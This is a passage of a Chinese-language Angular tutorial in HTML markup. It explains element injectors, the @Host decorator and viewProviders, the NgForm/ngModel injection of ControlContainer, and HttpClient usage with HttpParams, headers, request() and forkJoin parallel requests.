让我们看示例，假设组件模板中有父子元素 div，同时，还有两个指令 A 和 B。A 指令附着在父元素 div 上并提供 ADirService 服务，B 指令附着在子元素 div 上但不提供任何服务。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
        &lt;div a&gt;
            &lt;div b&gt;&lt;/div&gt;
        &lt;/div&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'[a]'</span><span class="token punctuation">,</span>
    providers<span class="token operator">:</span> <span class="token punctuation">[</span>ADirService<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ADirective</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span> selector<span class="token operator">:</span> <span class="token string">'[b]'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">BDirective</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>如果我们去探究 @angular/compiler 编译模板创建的元素节点定义对象，会发现存在两个 element 类型节点来描述 div 元素：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> viewDefinitionNodes <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// element definition for the parent div</span>
        element<span class="token operator">:</span> <span class="token punctuation">{</span>
            name<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">div</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
            publicProviders<span class="token operator">:</span> <span class="token punctuation">{</span>
                ADirective<span class="token operator">:</span> referenceToADirectiveProviderDefinition<span class="token punctuation">,</span>
                ADirService<span class="token operator">:</span> referenceToADirServiceProviderDefinition<span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// element definition for the child div</span>
        element<span class="token operator">:</span> <span class="token punctuation">{</span>
            name<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">div</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
            publicProviders<span class="token operator">:</span> <span class="token punctuation">{</span>
                BDirective<span class="token operator">:</span> referenceToBDirectiveProviderDefinition
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>每一个 div 元素定义都有个 publicProviders 作为依赖注入容器。由于附着在父 div 元素还提供了 ADirService 服务，所以该服务也被加到父元素 div 的元素注入器内。其实，嵌套 HTML 结构创建了多级元素注入器。子组件也创建了一个元素注入器，成了多级元素注入器的一部分，如下代码：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">adir</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a-comp</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a-comp</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>adir 指令提供一个服务，创建了两个层级元素注入器——上层级父注入器创建在 div 元素上，下层级子注入器创建在 a-comp 元素上，组件也仅仅是带有指令的 HTML 元素。</p> <p>Angular 使用 JavaScript 的原型链的属性查询机制来解析依赖，而不是一层层去查找父注入器去解析依赖：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>lDef<span class="token punctuation">.</span>element<span class="token punctuation">.</span>publicProviders<span class="token punctuation">[</span>tokenKey<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>由于 JavaScript 的工作方式，访问 publicProviders 对象 key 对应的值，会直接从父元素注入器或原型链中解析出来。</p> <p>注意@Host 会把元素注入器依赖解析过程限制在当前组件视图内。在一般依赖解析过程中，如果组件视图内的元素注入器不能解析一个令牌，Angular 依赖解析系统会遍历父视图，去使用组件/视图注入器来解析令牌，如果还没找到依赖，则遍历模块注入器去查找依赖。但是一旦使用了 @Host 装饰器，整个依赖解析过程就会在第一阶段完成后停止解析，也就是说，元素注入器只在组件视图内解析依赖，然后就停止解析工作。</p> <p>@Host 在表单指令里被大量使用,比如，往 ngModel 指令里注入一个表单容器，并把由该指令实例化的表单控件对象（FormControl）注入到表单对象内，典型的模板驱动表单代码如下：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">ngModel</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>实际上， NgForm 指令的选择器与 form DOM 元素匹配，该指令包含一个服务提供者，把自身注册为 ControlContainer 令牌指向的服务：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'form'</span><span class="token punctuation">,</span>
    providers<span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">{</span>
            provide<span class="token operator">:</span> ControlContainer<span class="token punctuation">,</span>
            useExisting<span class="token operator">:</span> NgForm
        <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgForm</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>而 ngModel 指令也是用 ControlContainer 令牌来注入依赖，并将自身注册为表单的一个控件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'[ngModel]'</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgModel</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">@<span class="token function">Optional</span><span class="token punctuation">(</span><span class="token punctuation">)</span> @<span class="token function">Host</span><span class="token punctuation">(</span><span class="token punctuation">)</span> parent<span class="token operator">:</span> ControlContainer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">private</span> <span class="token function">_setUpControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
        <span class="token operator">...</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>parent<span class="token punctuation">.</span>formDirective<span class="token punctuation">.</span><span class="token function">addControl</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>@Host 装饰器会把依赖解析过程限制在当前组件视图内，大多数情况下，这是预期的情况，但是有时候你需要在嵌套表单里注入来自父组件的表单对象。这时，Angular 在解析由 @Host 装饰的依赖时，会针对当前组件的 viewProviders 做额外的检查：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// check @Host restriction</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dep<span class="token punctuation">.</span>isHost <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>viewContext<span class="token punctuation">.</span>component<span class="token punctuation">.</span>isHost <span class="token operator">||</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>viewContext<span class="token punctuation">.</span>component<span class="token punctuation">.</span>type<span class="token punctuation">.</span>reference <span class="token operator">===</span> <span class="token function">tokenReference</span><span class="token punctuation">(</span>dep<span class="token punctuation">.</span>token <span class="token operator">!</span><span class="token punctuation">)</span> <span class="token operator">||</span>
        <span class="token comment">// this line</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>viewContext<span class="token punctuation">.</span>viewProviders<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token function">tokenReference</span><span class="token punctuation">(</span>dep<span class="token punctuation">.</span>token <span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
        result <span class="token operator">=</span> dep<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        result <span class="token operator">=</span> dep<span class="token punctuation">.</span>isOptional <span class="token operator">?</span> result <span class="token operator">=</span> <span class="token punctuation">{</span>isValue<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> value<span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">}</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>总之，DI 系统按照使用顺序包括三种注入器：元素注入器，组件注入器和模块注入器，而 @Host 装饰器会限制只使用元素注入器来解析依赖，如果当前组件依赖于被 @Host 修饰的依赖，或模板被绑定了指令且该指令依赖于被 @Host 修饰的依赖，就会报错解析不了该依赖（因为@Host 装饰器会限制只使用元素注入器来解析依赖，不会继续使用组件注入器从父组件那拿依赖），解决方案是可以在当前组件的 viewProviders 属性中提供这个依赖</p> <h2 id="服务-代理"><a href="#服务-代理" class="header-anchor">#</a> 服务/代理</h2> <p>一般服务我们拿来获取服务端的数据并做一些数据处理，事实上，当你发现多处组件有公用处理逻辑时，使用服务抽离公用逻辑也是方法之一，当然服务还可以用来做总线通讯。</p> <h3 id="httpclientmodule"><a href="#httpclientmodule" class="header-anchor">#</a> HttpClientModule</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>HttpClientModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
   declarations<span class="token operator">:</span> <span class="token punctuation">[</span>
       AppComponent
   <span class="token punctuation">]</span><span class="token punctuation">,</span>
   imports<span class="token operator">:</span> <span class="token punctuation">[</span>
       BrowserModule<span class="token punctuation">,</span>
       HttpClientModule
   <span class="token punctuation">]</span><span class="token punctuation">,</span>
   providers<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
   bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>需要注意的是，HttpClientModule的JSON 是默认的数据格式，我们不需要再进行显式的解析。即我们不需要再使用以下代码：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>现在我们可以这样写：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="get-post-put-delete"><a href="#get-post-put-delete" class="header-anchor">#</a> Get/Post/Put/Delete</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Component<span class="token punctuation">,</span> OnInit<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Observable<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;rxjs/Observable&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpClient<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> _ <span class="token keyword">from</span> <span class="token string">'lodash'</span><span class="token punctuation">;</span>
<span class="token keyword">interface</span> <span class="token class-name">Course</span> <span class="token punctuation">{</span>
    description<span class="token operator">:</span> string<span class="token punctuation">;</span>
    courseListIcon<span class="token operator">:</span>string<span class="token punctuation">;</span>
    iconUrl<span class="token operator">:</span>string<span class="token punctuation">;</span>
    longDescription<span class="token operator">:</span>string<span class="token punctuation">;</span>
    url<span class="token operator">:</span>string<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;ul *ngIf=&quot;courses$ | async as courses else noData&quot;&gt;
          &lt;li *ngFor=&quot;let course of courses&quot;&gt;
              {{course.description}}
          &lt;/li&gt; 
      &lt;/ul&gt;
      &lt;ng-template #noData&gt;No Data Available&lt;/ng-template&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
    courses$<span class="token operator">:</span> Observable<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> http<span class="token operator">:</span>HttpClient</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>courses$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http
            <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;https://angular-http-guide.firebaseio.com/courses.json&quot;</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> _<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">do</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h3 id="httpparams"><a href="#httpparams" class="header-anchor">#</a> HttpParams</h3> <ul><li>预期的 URL 地址如下：</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>angular<span class="token operator">-</span>http<span class="token operator">-</span>guide<span class="token punctuation">.</span>firebaseio<span class="token punctuation">.</span>com<span class="token operator">/</span>courses<span class="token punctuation">.</span>json<span class="token operator">?</span>orderBy<span class="token operator">=</span><span class="token string">&quot;$key&quot;</span><span class="token operator">&amp;</span>limitToFirst<span class="token operator">=</span><span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="创建-httpparams-对象"><a href="#创建-httpparams-对象" class="header-anchor">#</a> 创建 HttpParams 对象</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>HttpParams<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'orderBy'</span><span class="token punctuation">,</span> <span class="token string">'&quot;$key&quot;'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'limitToFirst'</span><span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>courses$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http
    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/courses.json&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>params<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">do</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> _<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>我们通过链式语法调用 set() 方法，构建 HttpParams 对象。这是因为 HttpParams 对象是不可变的，通过 set() 方法可以防止该对象被修改。</p> <p>每当调用 set() 方法，将会返回包含新值的 HttpParams 对象，因此如果使用下面的方式，将不能正确的设置参数。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'orderBy'</span><span class="token punctuation">,</span> <span class="token string">'&quot;$key&quot;'</span><span class="token punctuation">)</span>
params<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'limitToFirst'</span><span class="token punctuation">,</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="fromstring"><a href="#fromstring" class="header-anchor">#</a> fromString</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span>fromString<span class="token operator">:</span> <span class="token string">'orderBy=&quot;$key&quot;&amp;limitToFirst=1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="fromobject"><a href="#fromobject" class="header-anchor">#</a> fromObject</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code>使用 fromObject
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="request"><a href="#request" class="header-anchor">#</a> request()</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span>fromString<span class="token operator">:</span> <span class="token string">'orderBy=&quot;$key&quot;&amp;limitToFirst=1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>courses$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http
    <span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span>
        <span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;/courses.json&quot;</span><span class="token punctuation">,</span> 
        <span class="token punctuation">{</span>
            responseType<span class="token operator">:</span><span class="token string">&quot;json&quot;</span><span class="token punctuation">,</span>
            params
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">do</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> _<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h4 id="设置-http-headers"><a href="#设置-http-headers" class="header-anchor">#</a> 设置 HTTP Headers</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;X-CustomHeader&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;custom header value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>courses$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http
    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>
        <span class="token string">&quot;/courses.json&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span>headers<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">do</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> _<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="并行发送多个请求"><a href="#并行发送多个请求" class="header-anchor">#</a> 并行发送多个请求</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token string">'rxjs/add/observable/forkJoin'</span><span class="token punctuation">;</span>

<span class="token function">parallelRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">const</span> parallel$ <span class="token operator">=</span> Observable<span class="token punctuation">.</span><span class="token function">forkJoin</span><span class="token punctuation">(</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/courses/-KgVwEBq5wbFnjj7O8Fp.json'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/courses/-KgVwECOnlc-LHb_B0cQ.json'</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    parallel$<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>
        <span class="token parameter">values</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;all values&quot;</span><span class="token punctuation">,</span> values<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
